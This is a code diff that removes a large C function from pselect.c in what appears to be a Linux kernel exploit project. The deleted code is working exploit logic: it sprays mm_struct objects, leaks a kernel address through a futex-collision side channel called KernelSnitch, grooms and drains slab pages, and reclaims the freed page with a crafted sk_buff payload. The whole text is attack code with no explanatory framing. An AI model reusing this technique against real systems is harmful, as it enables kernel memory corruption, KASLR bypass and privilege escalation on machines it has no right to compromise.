+++ src/pselect.c
@@ -523,437 +523,5 @@ void *slide_pselect_consumer_thread(void *arg __attribute__((unused))) {
   }
 }
 
-/* --- Original prepare kernel page (uncontrolled mm spray for pselect) ----- */
-
-#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
-static void cleanup_failed_kernel_page(const char *reason) {
-  pr_info("kernel page cleanup failure=%s stage=kernelsnitch begin\n", reason);
-  kernelsnitch_cleanup(ks);
-  ks = NULL;
-  pr_info("kernel page cleanup failure=%s stage=prepare-children begin count=%zu\n",
-          reason, prepare_ctx.mm_cnt);
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    kill_child(prepare_ctx.childs[i]);
-  }
-  pr_info("kernel page cleanup failure=%s stage=prepare-children done\n", reason);
-  cleanup_page_prepare_state();
-}
-#endif
-
-uintptr_t prepare_kernel_page(int payload_mode) {
-  close_reclaim_sockets();
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-  cleanup_page_prepare_state();
-#endif
-  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
-  prepare_ctxs();
-
-  skb_buf = malloc(SKB_SEND_SIZE);
-  memset(skb_buf, 0x41, SKB_SEND_SIZE);
-
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    prepare_ctx.childs[i] = clone_child();
-  }
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
-  }
-
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
-    spray_ctx.childs[i] = clone_child();
-    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
-  }
-
-  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-  ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
-      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
-#if defined(KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
-    defined(KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
-  size_t search_min_object_index = FOPS_MIN_OBJECT_INDEX;
-  size_t search_max_object_index = mm_objs_per_slab - 1;
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    search_min_object_index = SLIDE_MIN_OBJECT_INDEX;
-    search_max_object_index = SLIDE_MAX_OBJECT_INDEX;
-  }
-  kernelsnitch_set_search_bounds(
-      ks, KERNELSNITCH_IDENTITY_START,
-      KERNEL_PAGE_KSNITCH_IDENTITY_END,
-      search_min_object_index, search_max_object_index,
-      KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
-#endif
-  configure_kernelsnitch_profile(ks, payload_mode);
-#else
-  ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
-#if defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    kernelsnitch_set_profile(
-        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
-        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
-        SLIDE_KSNITCH_AVERAGE);
-  }
-#endif
-#endif
-
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    pre_ctx.childs[i] = clone_child();
-  }
-  child_leak = clone_leak_child();
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
-    post_ctx.childs[i] = clone_child();
-  }
-
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
-  }
-  memfd_leak = open_memfd(child_leak);
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
-    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
-  }
-
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    kill_child(pre_ctx.childs[i]);
-  }
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
-    kill_child(post_ctx.childs[i]);
-  }
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
-    kill_child(spray_ctx.childs[i]);
-  }
-  SYSCHK(waitpid(child_leak, NULL, 0));
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-  log_mm_slabinfo("after-child-exit");
-#endif
-
-  if (!kernelsnitch_found_collisions(ks)) {
-    pr_warning("KernelSnitch collision finding failed\n");
-#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
-    cleanup_failed_kernel_page("collision");
-#else
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
-#endif
-    return 0;
-  }
-
-  kernelsnitch_bruteforce(ks);
-  uintptr_t leaked = ks->mm_struct;
-  if (leaked == (uintptr_t)-1) {
-    pr_warning("KernelSnitch mm_struct leak failed\n");
-#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
-    cleanup_failed_kernel_page("mm-leak");
-#else
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
-#endif
-    return 0;
-  }
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-  leaked = canonicalize_kernelsnitch_pointer(leaked);
-  log_mm_slabinfo("after-leak");
-#endif
-
-  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-  size_t object_index = (leaked - base) / MM_STRUCT_SZ;
-  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
-          leaked, base, object_index);
-#if defined(RECLAIM_MAX_DIRECT_BASE)
-  if (base >= RECLAIM_MAX_DIRECT_BASE) {
-    pr_warning("mm reclaim candidate rejected mode=%d base=%016zx max=%016llx\n",
-               payload_mode, base,
-               (unsigned long long)RECLAIM_MAX_DIRECT_BASE);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
-    return 0;
-  }
-#endif
-#if defined(SLIDE_MIN_OBJECT_INDEX)
-  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
-      object_index < SLIDE_MIN_OBJECT_INDEX) {
-    pr_warning("mm slide candidate rejected object_index=%zu min=%d\n",
-               object_index, SLIDE_MIN_OBJECT_INDEX);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
-    return 0;
-  }
-#endif
-#if defined(SLIDE_MAX_OBJECT_INDEX)
-  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
-      object_index > SLIDE_MAX_OBJECT_INDEX) {
-    pr_warning("mm slide candidate rejected object_index=%zu max=%d\n",
-               object_index, SLIDE_MAX_OBJECT_INDEX);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
-    return 0;
-  }
-#endif
-#if defined(FOPS_MIN_OBJECT_INDEX)
-  if (payload_mode == PAGE_PAYLOAD_FOPS &&
-      object_index < FOPS_MIN_OBJECT_INDEX) {
-    pr_warning("mm fops candidate rejected object_index=%zu min=%d\n",
-               object_index, FOPS_MIN_OBJECT_INDEX);
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
-    return 0;
-  }
-#endif
-#else
-  pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
-          leaked, base, (leaked - base) / MM_STRUCT_SZ);
-#endif
-  if (!prepare_skb_payload(base, payload_mode)) {
-#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
-    cleanup_failed_kernel_page("skb-payload");
-#else
-    kernelsnitch_cleanup(ks);
-    ks = NULL;
-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-      kill_child(prepare_ctx.childs[i]);
-    }
-    cleanup_page_prepare_state();
-#endif
-    return 0;
-  }
-
-  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-#ifdef SLIDE_RECLAIM_SNDBUF
-  int sndbuf = SLIDE_RECLAIM_SNDBUF;
-#else
-  int sndbuf = 1 << 20;
-#endif
-  errno = 0;
-  int sndbuf_set_ret =
-      setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
-                 sizeof(sndbuf));
-  int sndbuf_set_errno = errno;
-  socklen_t sndbuf_len = sizeof(sndbuf);
-  int sndbuf_effective = 0;
-  errno = 0;
-  int sndbuf_get_ret =
-      getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf_effective,
-                 &sndbuf_len);
-  int sndbuf_get_errno = errno;
-  pr_info("sk_buff reclaim sndbuf request=%d effective=%d "
-          "set_ret=%d set_errno=%d get_ret=%d get_errno=%d\n",
-          sndbuf, sndbuf_effective, sndbuf_set_ret, sndbuf_set_errno,
-          sndbuf_get_ret, sndbuf_get_errno);
-#else
-  int sndbuf = 1 << 20;
-  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
-#endif
-  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
-  if (reclaim_flags >= 0) {
-    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
-  }
-  int pcp_shaping_sv[2];
-  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));
-
-  struct iovec iov;
-  memset(&iov, 0, sizeof(iov));
-  iov.iov_base = skb_buf;
-  iov.iov_len = SKB_SEND_SIZE;
-
-  struct msghdr msg;
-  memset(&msg, 0, sizeof(msg));
-  msg.msg_iov = &iov;
-  msg.msg_iovlen = 1;
-
-  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
-#if defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW
-  SYSCHK(fflush(NULL));
-#endif
-
-  pin_to_core(CORE);
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
-    SYSCHK(close(spray_ctx.memfds[i]));
-    spray_ctx.memfds[i] = -1;
-  }
-  size_t target_pre = pre_ctx.mm_cnt - 1;
-  SYSCHK(close(pre_ctx.memfds[target_pre]));
-  pre_ctx.memfds[target_pre] = -1;
-  SYSCHK(close(post_ctx.memfds[0]));
-  post_ctx.memfds[0] = -1;
-#if !(defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW)
-  pr_info("mm target-neighbor slab queued for late drain\n");
-#endif
-  for (size_t i = 0; i < target_pre; i++) {
-    SYSCHK(close(pre_ctx.memfds[i]));
-    pre_ctx.memfds[i] = -1;
-  }
-  for (size_t i = 1; i < post_ctx.mm_cnt - 1; i++) {
-    SYSCHK(close(post_ctx.memfds[i]));
-    post_ctx.memfds[i] = -1;
-  }
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION && \
-    !(defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW)
-  log_mm_slabinfo("after-target-neighbors");
-#endif
-
-  SYSCHK(close(pcp_shaping_sv[0]));
-  SYSCHK(close(pcp_shaping_sv[1]));
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  SYSCHK(close(memfd_leak));
-  memfd_leak = -1;
-  size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-#ifdef MM_LATE_DRAIN_TRIGGERS
-  drain_triggers = MM_LATE_DRAIN_TRIGGERS;
-#endif
-  pid_t deferred_reap_children[drain_triggers ? drain_triggers : 1];
-  size_t deferred_reap_count = 0;
-  memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
-#endif
-  for (size_t i = 0; i < drain_triggers; i++) {
-    size_t index = i * mm_objs_per_slab;
-    SYSCHK(close(prepare_ctx.memfds[index]));
-    prepare_ctx.memfds[index] = -1;
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-#if (defined(DEFER_ALL_DRAIN_REAPS) && \
-     DEFER_ALL_DRAIN_REAPS) || \
-    (defined(DEFER_FINAL_DRAIN_REAP) && \
-     DEFER_FINAL_DRAIN_REAP)
-    int defer_reap = 0;
-#if defined(DEFER_ALL_DRAIN_REAPS) && DEFER_ALL_DRAIN_REAPS
-    defer_reap = 1;
-#elif defined(DEFER_FINAL_DRAIN_REAP) && DEFER_FINAL_DRAIN_REAP
-    defer_reap = i + 1 == drain_triggers;
-#endif
-    if (defer_reap) {
-      pid_t child = prepare_ctx.childs[index];
-      SYSCHK(kill(child, SIGKILL));
-      siginfo_t child_info;
-      memset(&child_info, 0, sizeof(child_info));
-      int wait_ret;
-      do {
-        wait_ret = waitid(P_PID, child, &child_info,
-                          WEXITED | WNOWAIT);
-      } while (wait_ret < 0 && errno == EINTR);
-      SYSCHK(wait_ret);
-      deferred_reap_children[deferred_reap_count++] = child;
-      prepare_ctx.childs[index] = -1;
-#if !(defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW)
-      pr_info("mm drain child exited deferred-reap trigger=%zu/%zu pid=%d "
-              "code=%d status=%d\n",
-              i + 1, drain_triggers, child, child_info.si_code,
-              child_info.si_status);
-#endif
-      continue;
-    }
-#endif
-#endif
-    kill_child(prepare_ctx.childs[index]);
-    prepare_ctx.childs[index] = -1;
-  }
-#if !defined(REQUIRE_FRESH_P0_SESSION) || !REQUIRE_FRESH_P0_SESSION
-  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
-#endif
-  int reclaim_sends = SKB_RECLAIM_SENDS;
-#if defined(PHYS_P0_ORACLE) && PHYS_P0_ORACLE
-  reclaim_sends = SLIDE_RECLAIM_SENDS;
-#endif
-  int reclaim_sent = 0;
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-  int reclaim_errno = 0;
-#endif
-  for (int i = 0; i < reclaim_sends; i++) {
-    errno = 0;
-    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
-    if (sent <= 0) {
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-      reclaim_errno = errno;
-#endif
-      break;
-    }
-    reclaim_sent++;
-  }
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
-  for (size_t i = 0; i < deferred_reap_count; i++) {
-    SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
-    pr_info("mm drain child reaped after reclaim index=%zu/%zu pid=%d\n",
-            i + 1, deferred_reap_count, deferred_reap_children[i]);
-  }
-#if defined(QUIET_RECLAIM_WINDOW) && QUIET_RECLAIM_WINDOW
-  pr_info("mm quiet reclaim window completed deferred-exits=%zu\n",
-          deferred_reap_count);
-#endif
-  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
-  pr_info("sk_buff reclaim sends=%d/%d mode=%d stop_errno=%d\n",
-          reclaim_sent, reclaim_sends, payload_mode, reclaim_errno);
-  log_mm_slabinfo("after-exact-drain-reclaim");
-#else
-  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
-          reclaim_sent, reclaim_sends, payload_mode);
-#endif
-#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
-  pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
-          payload_mode, base);
-#endif
-  kernelsnitch_cleanup(ks);
-  ks = NULL;
-#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
-  pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
-          payload_mode);
-
-  pr_info("kernel page cleanup stage=prepare-children begin count=%zu\n",
-          prepare_ctx.mm_cnt);
-#endif
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    if (prepare_ctx.memfds[i] >= 0) {
-      SYSCHK(close(prepare_ctx.memfds[i]));
-      prepare_ctx.memfds[i] = -1;
-    }
-    if (prepare_ctx.childs[i] > 0) {
-      kill_child(prepare_ctx.childs[i]);
-      prepare_ctx.childs[i] = -1;
-    }
-#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
-    if ((i + 1) % (8 * mm_objs_per_slab) == 0 ||
-        i + 1 == prepare_ctx.mm_cnt) {
-      pr_info("kernel page cleanup stage=prepare-children progress=%zu/%zu\n",
-              i + 1, prepare_ctx.mm_cnt);
-    }
-#endif
-  }
-#if defined(PHYS_VIRTUAL_BASE_ORACLE) && PHYS_VIRTUAL_BASE_ORACLE
-  pr_info("kernel page cleanup stage=prepare-children done base=%016zx\n",
-          base);
-#endif
-
-  return base;
-}
 
 #endif /* SLIDE_USE_PSELECT */
